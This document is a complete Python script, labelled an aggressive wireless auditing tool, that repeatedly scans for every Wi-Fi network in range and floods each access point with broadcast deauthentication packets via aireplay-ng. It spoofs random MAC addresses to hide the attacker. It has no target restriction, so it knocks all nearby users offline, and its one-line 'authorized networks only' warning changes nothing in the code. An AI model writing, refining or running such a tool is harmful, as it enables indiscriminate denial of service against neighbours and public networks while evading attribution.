import subprocess
import time
import random
import os
import re # For more robust parsing
import logging # For better feedback

# --- AGGRESSIVE DEFAULT CONFIGURATION (EDIT THESE IF NEEDED) ---
# Interface Configuration
PHY_INTERFACE = "wlan0"  # Common physical wireless interface
MONITOR_INTERFACE = "wlan0mon" # Expected name of monitor interface after airmon-ng
USE_AIRMON_NG = True       # Attempt to use airmon-ng to manage monitor mode.
                           # If False, MONITOR_INTERFACE must be manually put in monitor mode.

# Attack Parameters
ATTACK_DURATION_PER_AP = 15 # Seconds to continuously deauth each AP before cycling
PACKETS_FOR_AIREPLAY = 0   # 0 for continuous deauth until timeout (controlled by ATTACK_DURATION_PER_AP)
TARGET_CLIENT_MAC = "FF:FF:FF:FF:FF:FF" # Target all clients on the AP

# Timing and Cycling
SCAN_INTERVAL = 25          # Seconds between full network re-scans
INTER_ATTACK_DELAY = 0.3    # Seconds to pause after attacking an AP (allows channel switch to settle)

# Anonymity/Stealth
ENABLE_MAC_SPOOFING = True # Change MAC address during attacks

# Other
PRESERVE_IPTABLES_RULES = True # If True, script won't touch iptables. (iptables rule is minor for deauth)
# --- END OF CONFIGURATION ---

# Setup basic logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- Helper Functions (largely similar to previous version) ---
def check_root():
    if os.geteuid() != 0:
        logging.error("This script must be run as root.")
        exit(1)

def check_dependencies(tools):
    missing_tools = [tool for tool in tools if subprocess.call(['which', tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0]
    if missing_tools:
        logging.error(f"Required tools not found: {', '.join(missing_tools)}. Please install them.")
        exit(1)
    logging.info("All required tools are present.")

def random_mac():
    return ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])

def run_command(command, check=True, timeout=None, suppress_stderr_on_success=False):
    try:
        logging.debug(f"Running command: {' '.join(command)}")
        process = subprocess.run(command, capture_output=True, text=True, check=check, timeout=timeout)
        if process.stdout:
            logging.debug(f"Stdout: {process.stdout.strip()}")
        if process.stderr and (not suppress_stderr_on_success or process.returncode != 0):
            if process.returncode == 0 and suppress_stderr_on_success:
                 logging.debug(f"Stderr (info): {process.stderr.strip()}")
            else:
                 logging.warning(f"Stderr: {process.stderr.strip()}")
        return process
    except subprocess.CalledProcessError as e:
        logging.error(f"Command '{' '.join(e.cmd)}' failed (code {e.returncode}): {e.stderr.strip() if e.stderr else 'No stderr'}")
        return None
    except subprocess.TimeoutExpired:
        logging.error(f"Command '{' '.join(command)}' timed out after {timeout}s.")
        return None # Indicate timeout
    except Exception as e:
        logging.error(f"Unexpected error running command '{' '.join(command)}': {e}")
        return None

def get_permanent_mac(interface):
    # Ensure interface is up to read MAC, but don't fail script if this command fails
    run_command(['ifconfig', interface, 'up'], check=False, suppress_stderr_on_success=True)
    time.sleep(0.3)

    mac_output = run_command(['macchanger', '-s', interface], check=False, suppress_stderr_on_success=True)
    if mac_output and mac_output.stdout:
        match = re.search(r"Permanent MAC:\s*([0-9a-fA-F:]{17})", mac_output.stdout, re.IGNORECASE)
        if match:
            return match.group(1)
    mac_output = run_command(['ip', 'link', 'show', interface], check=False, suppress_stderr_on_success=True)
    if mac_output and mac_output.stdout:
        match = re.search(r"link/ether\s+([0-9a-fA-F:]{17})", mac_output.stdout, re.IGNORECASE)
        if match:
            return match.group(1)
    logging.warning(f"Could not reliably determine permanent MAC for {interface}. MAC restoration might use generic 'macchanger -p'.")
    return None

def set_interface_channel(interface, channel):
    logging.info(f"Setting {interface} to channel {channel}...")
    run_command(['ifconfig', interface, 'down'], check=False, suppress_stderr_on_success=True)
    time.sleep(0.1)
    result = run_command(['iwconfig', interface, 'channel', str(channel)], check=False, suppress_stderr_on_success=True)
    time.sleep(0.1)
    run_command(['ifconfig', interface, 'up'], check=False, suppress_stderr_on_success=True)
    time.sleep(0.3) # Allow interface to settle

    verify_result = run_command(['iwconfig', interface], check=False, suppress_stderr_on_success=True)
    if verify_result and verify_result.stdout:
        ch_match = re.search(r"Channel:(\d+)", verify_result.stdout) or \
                   re.search(r"Frequency:[\d\.]+ GHz \(Channel (\d+)\)", verify_result.stdout)
        if ch_match and ch_match.group(1) == str(channel):
            logging.debug(f"{interface} successfully set to channel {channel}.")
            return True
    logging.warning(f"Failed to verify or set {interface} to channel {channel}.")
    return False

def set_interface_mode(interface, mode, mac_address_option=None, bring_up=True, permanent_mac_to_restore=None):
    action = f"Configuring {interface}: mode={mode}"
    if mac_address_option:
        action += f", mac={mac_address_option}"
    logging.info(action)

    run_command(['ifconfig', interface, 'down'], check=False, suppress_stderr_on_success=True)
    time.sleep(0.1)

    if ENABLE_MAC_SPOOFING:
        if mac_address_option == "perm":
            if permanent_mac_to_restore:
                logging.info(f"Restoring MAC for {interface} to {permanent_mac_to_restore}.")
                run_command(['macchanger', '-m', permanent_mac_to_restore, interface], check=False, suppress_stderr_on_success=True)
            else:
                logging.info(f"Attempting to restore permanent MAC for {interface} using 'macchanger -p'.")
                run_command(['macchanger', '-p', interface], check=False, suppress_stderr_on_success=True)
        elif mac_address_option: # A specific random MAC
            logging.info(f"Setting MAC for {interface} to {mac_address_option}.")
            run_command(['macchanger', '-m', mac_address_option, interface], check=False, suppress_stderr_on_success=True)

    time.sleep(0.1)
    run_command(['iwconfig', interface, 'mode', mode], check=False, suppress_stderr_on_success=True)
    time.sleep(0.1)

    if bring_up:
        run_command(['ifconfig', interface, 'up'], check=False, suppress_stderr_on_success=True)
    time.sleep(0.3)

def scan_networks(interface):
    logging.info(f"Scanning for networks on {interface}...")
    run_command(['ifconfig', interface, 'up'], check=False, suppress_stderr_on_success=True)
    time.sleep(0.5)

    scan_cmd = ['iwlist', interface, 'scan']
    output_process = run_command(scan_cmd, check=False) # iwlist can have non-zero exit on warnings
    networks = []

    if output_process and output_process.stdout:
        cells = output_process.stdout.split("Cell ")
        for cell_block in cells[1:]:
            bssid_match = re.search(r"Address: (([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})", cell_block)
            channel_match = re.search(r"Channel:(\d+)", cell_block) or \
                            re.search(r"Frequency:[\d\.]+ GHz \(Channel (\d+)\)", cell_block)
            essid_match = re.search(r"ESSID:\"([^\"]+)\"", cell_block)

            if bssid_match and channel_match and essid_match:
                bssid = bssid_match.group(1).upper()
                channel = channel_match.group(1)
                essid = essid_match.group(1)
                if essid and essid != "<hidden>" and essid.strip() and not any(n[1] == bssid for n in networks):
                    networks.append((essid, bssid, channel))
                    logging.debug(f"Found: ESSID='{essid}', BSSID='{bssid}', Channel='{channel}'")
    if not networks:
        logging.warning("No networks found or failed to parse scan results.")
    else:
        logging.info(f"Found {len(networks)} unique networks.")
    return networks

def deauth_attack_target(interface_to_use, bssid, channel, original_mac_backup):
    logging.info(f"--- Targeting BSSID: {bssid} on Channel: {channel} with {interface_to_use} ---")

    current_mac = random_mac() if ENABLE_MAC_SPOOFING else "perm"
    set_interface_mode(interface_to_use, "monitor", mac_address_option=current_mac, bring_up=False, permanent_mac_to_restore=original_mac_backup)

    if not set_interface_channel(interface_to_use, channel):
        logging.error(f"Failed to set {interface_to_use} to channel {channel}. Skipping attack on {bssid}.")
        if ENABLE_MAC_SPOOFING: # Restore original MAC if spoofing was attempted
             set_interface_mode(interface_to_use, "monitor", mac_address_option="perm", bring_up=True, permanent_mac_to_restore=original_mac_backup)
        return

    run_command(['ifconfig', interface_to_use, 'up'], check=False, suppress_stderr_on_success=True) # Ensure up after mode/channel changes
    time.sleep(0.3)

    logging.info(f"Starting deauth attack on BSSID: {bssid}, TargetClients: {TARGET_CLIENT_MAC}, Duration: {ATTACK_DURATION_PER_AP}s")
    command = ['aireplay-ng', '-0', str(PACKETS_FOR_AIREPLAY), '-a', bssid, '-c', TARGET_CLIENT_MAC, interface_to_use]

    # run_command will use ATTACK_DURATION_PER_AP as timeout if PACKETS_FOR_AIREPLAY is 0
    attack_process = run_command(command, check=False, timeout=ATTACK_DURATION_PER_AP if PACKETS_FOR_AIREPLAY == 0 else None)

    if attack_process is None : # Timeout occurred or other run_command failure
        logging.warning(f"Deauth attack on {bssid} may have timed out or failed to start.")
    elif attack_process.returncode == 0:
        logging.info(f"Deauthentication command for {bssid} completed (may have been timed out by wrapper if continuous).")
    else: # Aireplay-ng exited with an error
        logging.warning(f"Deauthentication attack on {bssid} exited with code {attack_process.returncode}.")

    if ENABLE_MAC_SPOOFING: # Restore permanent MAC to the interface after attack for this target
        set_interface_mode(interface_to_use, "monitor", mac_address_option="perm", bring_up=True, permanent_mac_to_restore=original_mac_backup)


# --- Main Script ---
def main():
    print("--- Aggressive Wireless Network Auditing Tool ---")
    print(f"--- Using PHY_INTERFACE: {PHY_INTERFACE}, Target MONITOR_INTERFACE: {MONITOR_INTERFACE} ---")
    print(f"--- Attack Duration per AP: {ATTACK_DURATION_PER_AP}s, Scan Interval: {SCAN_INTERVAL}s ---")
    print("--- WARNING: This tool can cause significant network disruption. ---")
    print("--- Use responsibly and only on authorized networks. ---")
    print("Press Ctrl+C to stop.")
    time.sleep(3) # Give user time to read warning

    check_root()
    required_tools = ['ifconfig', 'iwconfig', 'iwlist', 'aireplay-ng']
    if ENABLE_MAC_SPOOFING:
        required_tools.append('macchanger')
    if USE_AIRMON_NG:
        required_tools.append('airmon-ng')
    check_dependencies(required_tools)

    active_monitor_interface = MONITOR_INTERFACE
    original_phy_mac = None

    if USE_AIRMON_NG:
        logging.info(f"Attempting to start monitor mode on {PHY_INTERFACE} using airmon-ng...")
        run_command(['airmon-ng', 'check', 'kill'], check=False, suppress_stderr_on_success=True)
        start_mon_proc = run_command(['airmon-ng', 'start', PHY_INTERFACE], check=False, suppress_stderr_on_success=True)
        # We will assume airmon-ng creates/renames to MONITOR_INTERFACE or user configured MONITOR_INTERFACE correctly
        # More robust detection of the created interface name would be complex.
        if not start_mon_proc or start_mon_proc.returncode != 0:
            logging.warning(f"Airmon-ng start might have failed or interface {MONITOR_INTERFACE} not created as expected. Will try to use '{MONITOR_INTERFACE}' directly.")
        else:
            logging.info(f"Airmon-ng hopefully started {MONITOR_INTERFACE}. If not, ensure {MONITOR_INTERFACE} is correct and in monitor mode.")
    else:
        logging.info(f"Using specified MONITOR_INTERFACE: {MONITOR_INTERFACE}. Ensure it is already in monitor mode if USE_AIRMON_NG is False.")


    if ENABLE_MAC_SPOOFING:
        # Get permanent MAC of the PHYSICAL interface (wlan0) before it's potentially changed by monitor mode or spoofing.
        original_phy_mac = get_permanent_mac(PHY_INTERFACE)
        if original_phy_mac:
            logging.info(f"Original permanent MAC for base interface {PHY_INTERFACE}: {original_phy_mac}")
        else:
            logging.warning(f"Could not get permanent MAC for {PHY_INTERFACE}. MAC restoration for {PHY_INTERFACE} might be less precise.")

    iptables_rule_applied = False # Placeholder if iptables logic is re-added

    try:
        while True:
            logging.info(f"--- Starting new scan and attack cycle on {active_monitor_interface} ---")
            # Ensure monitor interface is in monitor mode and set initial MAC for scan
            initial_scan_mac = random_mac() if ENABLE_MAC_SPOOFING else "perm"
            set_interface_mode(active_monitor_interface, "monitor", mac_address_option=initial_scan_mac, bring_up=True, permanent_mac_to_restore=original_phy_mac)

            networks_found = scan_networks(active_monitor_interface)

            if not networks_found:
                logging.warning(f"No networks found. Waiting {SCAN_INTERVAL} seconds before re-scan.")
                time.sleep(SCAN_INTERVAL)
                continue

            logging.info(f"Found {len(networks_found)} networks. Initiating attacks...")
            for essid, bssid, channel_str in networks_found:
                try:
                    if not channel_str or not channel_str.isdigit():
                        logging.warning(f"Invalid channel ('{channel_str}') for {essid} ({bssid}). Skipping.")
                        continue
                    channel = int(channel_str)

                    # Pass the original_phy_mac for restoration purposes
                    deauth_attack_target(active_monitor_interface, bssid, channel, original_phy_mac)

                    logging.debug(f"Attack on {essid} ({bssid}) cycle complete. Waiting {INTER_ATTACK_DELAY}s.")
                    time.sleep(INTER_ATTACK_DELAY)

                except Exception as e_ap:
                    logging.error(f"Error during attack on {essid} ({bssid}): {e_ap}", exc_info=True)
                    logging.info("Attempting to recover and continue...")
                    set_interface_mode(active_monitor_interface, "monitor", mac_address_option="perm", bring_up=True, permanent_mac_to_restore=original_phy_mac)
                    time.sleep(1)

            logging.info(f"Completed attacking all {len(networks_found)} targets in this cycle.")
            logging.info(f"Waiting {SCAN_INTERVAL} seconds before next full scan...")
            time.sleep(SCAN_INTERVAL)

    except KeyboardInterrupt:
        logging.info("Keyboard interrupt received. Cleaning up...")
    except Exception as e:
        logging.error(f"Critical unexpected error in main loop: {e}", exc_info=True)
    finally:
        logging.info("--- Initiating Cleanup ---")
        active_interface_for_cleanup = active_monitor_interface
        final_mode_restore_interface = PHY_INTERFACE if USE_AIRMON_NG else active_monitor_interface

        if USE_AIRMON_NG:
            logging.info(f"Attempting to stop monitor mode on {active_monitor_interface} using airmon-ng...")
            run_command(['airmon-ng', 'stop', active_monitor_interface], check=False, suppress_stderr_on_success=True)
            # After stopping, operations should target the physical interface
            logging.info(f"Monitor mode on {active_monitor_interface} hopefully stopped. Will configure {PHY_INTERFACE}.")
        else:
            logging.info(f"Not using airmon-ng for cleanup. Will configure {active_monitor_interface}.")


        logging.info(f"Setting {final_mode_restore_interface} to managed mode and restoring its permanent MAC (if known).")
        # Use original_phy_mac for restoration on the phy_interface
        set_interface_mode(final_mode_restore_interface, "managed", mac_address_option="perm", bring_up=True, permanent_mac_to_restore=original_phy_mac)

        # Final explicit up for physical interface
        run_command(['ifconfig', PHY_INTERFACE, 'up'], check=False, suppress_stderr_on_success=True)

        logging.info("Script cleanup finished. Network interface should be restored.")
        print("Exiting.")

if __name__ == "__main__":
    main()
